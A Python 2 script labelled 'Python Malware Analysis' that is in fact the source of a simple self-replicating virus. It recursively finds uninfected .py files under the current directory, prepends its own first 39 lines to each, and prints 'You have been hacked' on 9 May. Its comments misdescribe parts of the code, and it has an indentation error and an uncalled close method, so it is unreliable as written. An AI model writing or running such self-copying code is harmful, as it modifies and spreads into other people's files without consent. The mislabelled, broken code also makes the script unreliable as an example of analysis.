#!/usr/bin/python
#Script Name    Python Malware Analysis
#Author         James Moring
#Date of last revision  09/25/2022





import os
#open file using OS model
import datetime
#insert date using the datetime module

SIGNATURE = "VIRUS"
#the variable for signature is virus


#function is being created and excuted here
#user is being asked for a file path
def locate(path):
    #the variable files_targeted locates the path from the user input
    files_targeted = []
    #the variable filelist grabs all the files and directories in the specficed directory that the user input
    filelist = os.listdir(path)
    #for the filename in the variable named filelist
    for fname in filelist:
    #condition that includes files and directories and file path and also filename  
        if os.path.isdir(path+"/"+fname):
    #extend condition to a list of files that the user input
            files_targeted.extend(locate(path+"/"+fname))
    # if filename has -3 and .py which is a python file extension
        elif fname[-3:] == ".py":
    #file is not infected and the condition would be false and the file is not infected
            infected = False
    #if this is a virus in file then the condition would be true the file is infected
              for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
    #if the return is false and there is no virus indicated then the requested files are returned 
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted
#this function is if the files are infected a virus is present
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
#this would destory the file that contains the virus and then print out you have been hacked with time and date
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()